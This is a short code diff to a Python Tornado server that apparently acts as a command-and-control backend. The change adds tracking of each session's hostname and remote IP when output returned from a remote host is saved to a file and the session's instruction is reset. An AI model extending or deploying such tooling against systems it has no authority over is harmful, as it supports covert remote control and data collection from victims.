@@ -118,6 +118,14 @@ def register_assets(sessionid, hostname, remoteip):
     assets.append(asset)
 
 
+def update_asset(sessionid, hostname, remoteip):
+    global assets
+    for asset in assets:
+        if asset['sessionid'] == sessionid:
+            asset['hostname'] = hostname
+            asset['remoteip'] = remoteip
+
+
 def randomString():
     """Generate a random string of fixed length """
     letters = string.ascii_letters
@@ -344,6 +352,7 @@ class SPQ(tornado.web.RequestHandler):
         else:
             hostname = query_output.split("::::")[0]
             data = query_output.split("::::")[1]
+            update_asset(sid, hostname, remote_ip)
             with open("clone_site/received_" + sid + ".txt", "w") as fh:
                 fh.write('=-=-=-=-=-=-=-=-=-=-=\n(HOSTNAME: {}\nCLIENT: {})\n{}'.format(hostname, remote_ip, str(data)))
             set_instruction(sid, "nothing")
